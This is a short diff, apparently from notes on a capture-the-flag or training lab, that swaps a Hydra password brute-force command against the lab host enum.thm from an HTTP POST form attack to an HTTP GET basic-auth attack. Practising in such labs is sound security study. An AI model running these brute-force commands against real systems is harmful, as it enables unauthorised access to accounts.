@@ -23,4 +23,4 @@ example of a http login:
 
 
 Real life example - 
-hydra -l admin -P pass.txt enum.thm http-post-form "/labs/basic_auth/:username=^USER^&password=^PASS^:F=Unauthorized"
+hydra -l admin -P password.txt enum.thm http-get /labs/basic_auth/
